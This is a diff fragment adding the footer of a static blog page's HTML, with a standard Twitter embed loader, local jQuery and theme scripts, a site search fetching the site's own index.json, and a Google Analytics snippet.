+  window.hasTwitterEmbed =  true 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="/js/jquery.min.js"></script>
+<script src="/js/semantic.min.js"></script>
+<script src="/js/jquery.overlayScrollbars.min.js"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+<script src="/js/html2canvas.min.js"></script>
+<script src="/js/post.js"></script>
+
+
+
+
+
+    
+      <div class="ui inverted segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="Search" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/www.geekyang.top/index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: true,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-98295641-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+  </body>
+</html>
